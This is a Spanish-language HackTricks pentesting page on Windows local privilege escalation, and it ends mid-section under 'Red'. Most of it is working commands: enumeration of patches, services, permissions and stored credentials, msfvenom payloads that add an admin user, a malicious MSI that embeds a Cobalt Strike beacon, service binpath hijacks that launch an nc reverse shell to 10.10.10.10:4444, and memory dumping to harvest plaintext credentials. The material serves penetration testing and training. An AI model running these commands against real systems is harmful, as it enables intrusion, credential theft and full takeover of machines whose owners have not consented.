# Escalada de privilegios local en Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **La mejor herramienta para buscar vectores de escalada de privilegios locales en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoría inicial de Windows

### Tokens de acceso

**Si no sabes qué son los tokens de acceso de Windows, lee la siguiente página antes de continuar:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Si no sabes qué es alguno de los acrónimos utilizados en el encabezado de esta sección, lee la siguiente página antes de continuar:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Niveles de integridad

**Si no sabes qué son los niveles de integridad en Windows, deberías leer la siguiente página antes de continuar:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Controles de seguridad de Windows

Hay diferentes cosas en Windows que podrían **impedirte enumerar el sistema**, ejecutar ejecutables o incluso **detectar tus actividades**. Deberías **leer** la siguiente **página** y **enumerar** todos estos **mecanismos de defensa** antes de comenzar la enumeración de la escalada de privilegios:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Información del sistema

### Enumeración de información de versión

Comprueba si la versión de Windows tiene alguna vulnerabilidad conocida (también comprueba los parches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Vulnerabilidades de versión

Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre vulnerabilidades de seguridad de Microsoft. Esta base de datos tiene más de 4,700 vulnerabilidades de seguridad, mostrando la **gran superficie de ataque** que presenta un entorno de Windows.

**En el sistema**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tiene watson integrado)_

**Localmente con información del sistema**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositorios de exploits en Github:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Entorno

¿Hay alguna credencial/información valiosa guardada en las variables de entorno?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Historial de PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Archivos de transcripción de PowerShell

Puedes aprender cómo activar esto en [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Registro de módulos de PowerShell

Registra los detalles de ejecución de la canalización de PowerShell. Esto incluye los comandos que se ejecutan, incluyendo las invocaciones de comandos y algunas porciones de los scripts. Es posible que no tenga todos los detalles de la ejecución y los resultados de salida.\
Puede habilitar esto siguiendo el enlace de la última sección (Archivos de transcripción), pero habilitando "Registro de módulos" en lugar de "Transcripción de PowerShell".
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para ver los últimos 15 eventos de los registros de PowerShell, puedes ejecutar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Registro de Bloques de Script**

Registra bloques de código a medida que se ejecutan, capturando así la actividad completa y el contenido completo del script. Mantiene el registro completo de auditoría de cada actividad, lo que puede ser utilizado posteriormente en la investigación forense y para estudiar el comportamiento malicioso. Registra toda la actividad en el momento de la ejecución, proporcionando así los detalles completos.
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Los eventos de registro de Script Block se pueden encontrar en el visor de eventos de Windows en la siguiente ruta: _Application and Services Logs > Microsoft > Windows > Powershell > Operational_\
Para ver los últimos 20 eventos, puedes usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configuración de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unidades
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puedes comprometer el sistema si las actualizaciones no se solicitan usando http**S** sino http.

Comienza verificando si la red utiliza una actualización de WSUS sin SSL ejecutando lo siguiente:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Si recibes una respuesta como:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Y si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` es igual a `1`.

Entonces, **es explotable**. Si el último registro es igual a 0, entonces la entrada de WSUS será ignorada.

Para explotar estas vulnerabilidades, se pueden utilizar herramientas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Estos son scripts de exploits weaponizados de MiTM para inyectar actualizaciones "falsas" en el tráfico de WSUS no SSL.

Lea la investigación aquí:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Lea el informe completo aquí**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Básicamente, esta es la falla que explota este error:

> Si tenemos el poder de modificar nuestro proxy de usuario local, y las actualizaciones de Windows usan el proxy configurado en la configuración de Internet Explorer, por lo tanto, tenemos el poder de ejecutar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nuestro propio tráfico y ejecutar código como un usuario elevado en nuestro activo.
>
> Además, dado que el servicio WSUS utiliza la configuración del usuario actual, también utilizará su almacén de certificados. Si generamos un certificado autofirmado para el nombre de host de WSUS y agregamos este certificado en el almacén de certificados del usuario actual, podremos interceptar tanto el tráfico de WSUS HTTP como HTTPS. WSUS no utiliza mecanismos similares a HSTS para implementar una validación de tipo de confianza en la primera utilización en el certificado. Si el certificado presentado es confiable por el usuario y tiene el nombre de host correcto, será aceptado por el servicio.

Puede explotar esta vulnerabilidad utilizando la herramienta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una vez que se libere).

## KrbRelayUp

Básicamente, se trata de una escalada de privilegios local universal sin solución en entornos de dominio de Windows donde no se aplica la firma LDAP, donde el usuario tiene derechos de autoconfiguración (para configurar RBCD) y donde el usuario puede crear equipos en el dominio.\
Todos los **requisitos** se satisfacen con la **configuración predeterminada**.

Encuentre el **exploit en** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Incluso si el ataque es Para obtener más información sobre el flujo del ataque, consulte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** estos 2 registros están **habilitados** (el valor es **0x1**), entonces los usuarios de cualquier privilegio pueden **instalar** (ejecutar) archivos `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Cargas útiles de Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si tienes una sesión de meterpreter, puedes automatizar esta técnica utilizando el módulo **`exploit/windows/local/always_install_elevated`**.

### PowerUP

Usa el comando `Write-UserAddMSI` de PowerUp para crear un binario MSI de Windows dentro del directorio actual y así escalar privilegios. Este script escribe un instalador MSI precompilado que solicita la adición de un usuario/grupo (por lo que necesitarás acceso GUI):
```
Write-UserAddMSI
```
Simplemente ejecute el binario creado para escalar privilegios.

### MSI Wrapper

Lea este tutorial para aprender cómo crear un envoltorio MSI utilizando estas herramientas. Tenga en cuenta que puede envolver un archivo "**.bat**" si solo desea ejecutar líneas de comando.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Crear MSI con WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Crear MSI con Visual Studio

* **Genere** con Cobalt Strike o Metasploit un **nuevo payload TCP de Windows EXE** en `C:\privesc\beacon.exe`
* Abra **Visual Studio**, seleccione **Crear un nuevo proyecto** y escriba "instalador" en el cuadro de búsqueda. Seleccione el proyecto **Asistente para configuración** y haga clic en **Siguiente**.
* Asigne un nombre al proyecto, como **AlwaysPrivesc**, use **`C:\privesc`** para la ubicación, seleccione **colocar solución y proyecto en el mismo directorio** y haga clic en **Crear**.
* Siga haciendo clic en **Siguiente** hasta llegar al paso 3 de 4 (elegir archivos para incluir). Haga clic en **Agregar** y seleccione el payload Beacon que acaba de generar. Luego haga clic en **Finalizar**.
* Resalte el proyecto **AlwaysPrivesc** en el **Explorador de soluciones** y en las **Propiedades**, cambie **TargetPlatform** de **x86** a **x64**.
  * Hay otras propiedades que puede cambiar, como el **Autor** y el **Fabricante**, que pueden hacer que la aplicación instalada parezca más legítima.
* Haga clic con el botón derecho en el proyecto y seleccione **Ver > Acciones personalizadas**.
* Haga clic con el botón derecho en **Instalar** y seleccione **Agregar acción personalizada**.
* Haga doble clic en **Carpeta de aplicaciones**, seleccione su archivo **beacon.exe** y haga clic en **Aceptar**. Esto asegurará que el payload Beacon se ejecute tan pronto como se ejecute el instalador.
* En las **Propiedades de la acción personalizada**, cambie **Run64Bit** a **True**.
* Finalmente, **compílelo**.
  * Si se muestra la advertencia `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, asegúrese de establecer la plataforma en x64.

### Instalación de MSI

Para ejecutar la **instalación** del archivo `.msi` malicioso en **segundo plano**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explotar esta vulnerabilidad puedes usar: _exploit/windows/local/always\_install\_elevated_

## Antivirus y Detectores

### Configuración de Auditoría

Estas configuraciones deciden qué se está **registrando**, por lo que debes prestar atención.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, es interesante saber a dónde se envían los registros.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** te permite **administrar la contraseña del Administrador local** (que es **aleatoria**, única y **cambiada regularmente**) en computadoras unidas al dominio. Estas contraseñas se almacenan centralmente en Active Directory y se restringen a usuarios autorizados mediante ACL. Si se le otorgan suficientes permisos a tu usuario, es posible que puedas leer las contraseñas de los administradores locales.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Si está activo, **las contraseñas en texto plano se almacenan en LSASS** (Local Security Authority Subsystem Service).\
[**Más información sobre WDigest en esta página**](../stealing-credentials/credentials-protections.md#wdigest).
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### Protección de LSA

Microsoft en **Windows 8.1 y posteriores** ha proporcionado protección adicional para LSA para **prevenir** que procesos no confiables puedan **leer su memoria** o inyectar código.\
[**Más información sobre la protección de LSA aquí**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### Protección de Credenciales

**Credential Guard** es una nueva característica en Windows 10 (edición Enterprise y Education) que ayuda a proteger tus credenciales en una máquina de amenazas como el pass the hash.\
[**Más información sobre Credential Guard aquí.**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### Credenciales en caché

Las **credenciales de dominio** son utilizadas por los componentes del sistema operativo y son **autenticadas** por la **Autoridad de Seguridad Local** (LSA). Por lo general, las credenciales de dominio se establecen para un usuario cuando un paquete de seguridad registrado autentica los datos de inicio de sesión del usuario.\
[**Más información sobre las credenciales en caché aquí**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuarios y Grupos

### Enumerar Usuarios y Grupos

Deberías comprobar si alguno de los grupos a los que perteneces tienen permisos interesantes.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Si **perteneces a algún grupo privilegiado, podrías ser capaz de escalar privilegios**. Aprende acerca de los grupos privilegiados y cómo abusar de ellos para escalar privilegios aquí:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulación de tokens

**Aprende más** acerca de lo que es un **token** en esta página: [**Tokens de Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Revisa la siguiente página para **aprender acerca de tokens interesantes** y cómo abusar de ellos:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Usuarios registrados / Sesiones
```
qwinsta
klist sessions
```
### Carpetas de usuario
```
dir C:\Users
Get-ChildItem C:\Users
```
### Política de contraseñas
```
net accounts
```
### Obtener el contenido del portapapeles
```bash
powershell -command "Get-Clipboard"
```
## Procesos en ejecución

### Permisos de archivos y carpetas

En primer lugar, al listar los procesos **verifique si hay contraseñas dentro de la línea de comandos del proceso**.\
Compruebe si puede **sobrescribir algún binario en ejecución** o si tiene permisos de escritura en la carpeta del binario para explotar posibles [**ataques de secuestro de DLL**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Siempre revise si hay posibles depuradores de [**electron/cef/chromium**] en ejecución, ya que podría abusar de ellos para escalar privilegios.

**Comprobación de permisos de los binarios de los procesos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```
**Comprobando los permisos de las carpetas de los binarios de los procesos (Hijacking de DLL)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
todos %username%" && echo.
)
```
### Minería de contraseñas en memoria

Puedes crear un volcado de memoria de un proceso en ejecución usando **procdump** de sysinternals. Servicios como FTP tienen las **credenciales en texto claro en la memoria**, intenta hacer un volcado de memoria y leer las credenciales.
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicaciones GUI inseguras

**Las aplicaciones que se ejecutan como SYSTEM pueden permitir a un usuario generar un CMD o navegar por directorios.**

Ejemplo: "Ayuda y soporte técnico de Windows" (Windows + F1), buscar "símbolo del sistema", hacer clic en "Haga clic para abrir el símbolo del sistema"

## Servicios

Obtener una lista de servicios:
```
net start
wmic service list brief
sc query
Get-Service
```
### Permisos

Puedes usar **sc** para obtener información de un servicio.
```
sc qc <service_name>
```
Se recomienda tener el binario **accesschk** de _Sysinternals_ para comprobar el nivel de privilegio requerido para cada servicio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Se recomienda verificar si "Usuarios autenticados" pueden modificar algún servicio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Puedes descargar accesschk.exe para XP aquí](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Habilitar servicio

Si tienes este error (por ejemplo con SSDPSRV):

_Error del sistema 1058 ha ocurrido._\
_El servicio no puede iniciarse porque está deshabilitado o porque no tiene dispositivos habilitados asociados._

Puedes habilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
Tenga en cuenta que el servicio upnphost depende de SSDPSRV para funcionar (en XP SP1).

Otra solución alternativa a este problema es ejecutar:
```
sc.exe config usosvc start= auto
```
### **Modificar la ruta del binario del servicio**

Si el grupo "Usuarios autenticados" tiene **SERVICE\_ALL\_ACCESS** en un servicio, entonces puede modificar el binario que está siendo ejecutado por el servicio. Para modificarlo y ejecutar **nc** puedes hacer lo siguiente:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar servicio
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Otras permisiones pueden ser utilizadas para escalar privilegios:\
**SERVICE\_CHANGE\_CONFIG** Puede reconfigurar el binario del servicio\
**WRITE\_DAC:** Puede reconfigurar permisos, lo que lleva a SERVICE\_CHANGE\_CONFIG\
**WRITE\_OWNER:** Puede convertirse en propietario, reconfigurar permisos\
**GENERIC\_WRITE:** Hereda SERVICE\_CHANGE\_CONFIG\
**GENERIC\_ALL:** Hereda SERVICE\_CHANGE\_CONFIG

**Para detectar y explotar** esta vulnerabilidad se puede utilizar _exploit/windows/local/service\_permissions_

### Permisos débiles en los binarios de servicios

**Comprueba si puedes modificar el binario que es ejecutado por un servicio** o si tienes **permisos de escritura en la carpeta** donde se encuentra el binario ([**DLL Hijacking**](dll-hijacking.md))**.**\
Puedes obtener cada binario que es ejecutado por un servicio utilizando **wmic** (no en system32) y comprobar tus permisos utilizando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
También puedes usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permisos de modificación del registro de servicios

Deberías comprobar si puedes modificar cualquier registro de servicios.\
Puedes **verificar** tus **permisos** sobre un **registro de servicios** haciendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Comprueba si **Usuarios autenticados** o **NT AUTHORITY\INTERACTIVE** tienen FullControl. En ese caso, puedes cambiar el binario que va a ser ejecutado por el servicio.

Para cambiar la ruta del binario ejecutado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permisos AppendData/AddSubdirectory en el registro de servicios

Si tienes este permiso sobre un registro, significa que **puedes crear subregistros a partir de este**. En el caso de los servicios de Windows, esto es **suficiente para ejecutar código arbitrario**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Rutas de servicio sin comillas

Si la ruta a un ejecutable no está dentro de comillas, Windows intentará ejecutar todo lo que esté antes de un espacio.

Por ejemplo, para la ruta _C:\Program Files\Some Folder\Service.exe_, Windows intentará ejecutar:
```
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```
Para listar todas las rutas de servicio no entrecomilladas (excepto los servicios integrados de Windows)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
Puedes detectar y explotar esta vulnerabilidad con Metasploit: _exploit/windows/local/trusted\_service\_path_.\
Puedes crear manualmente un binario de servicio con Metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Acciones de recuperación

Es posible indicarle a Windows qué hacer cuando falla la ejecución de un servicio. Si esa configuración apunta a un binario y ese binario puede ser sobrescrito, es posible escalar privilegios.

## Aplicaciones

### Aplicaciones instaladas

Verifique los **permisos de los binarios** (tal vez pueda sobrescribir uno y escalar privilegios) y de las **carpetas** (Hijacking DLL).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permisos de escritura

Verifique si puede modificar algún archivo de configuración para leer algún archivo especial o si puede modificar algún binario que va a ser ejecutado por una cuenta de Administrador (schedtasks).

Una forma de encontrar permisos débiles de carpetas/archivos en el sistema es haciendo:
```bash
accesschk.exe /accepteula 
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Ejecutar al inicio

**Comprueba si puedes sobrescribir algún registro o binario que vaya a ser ejecutado por otro usuario.**\
**Lee** la **siguiente página** para aprender más sobre **ubicaciones interesantes de autoruns para escalar privilegios**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Controladores

Busca posibles **controladores de terceros extraños/vulnerables**.
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## Secuestro de DLL de PATH

Si tienes **permisos de escritura dentro de una carpeta presente en PATH**, podrías ser capaz de secuestrar una DLL cargada por un proceso y **escalar privilegios**.

Verifica los permisos de todas las carpetas dentro de PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para obtener más información sobre cómo abusar de esta comprobación:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Red

### Comparticiones
```bash
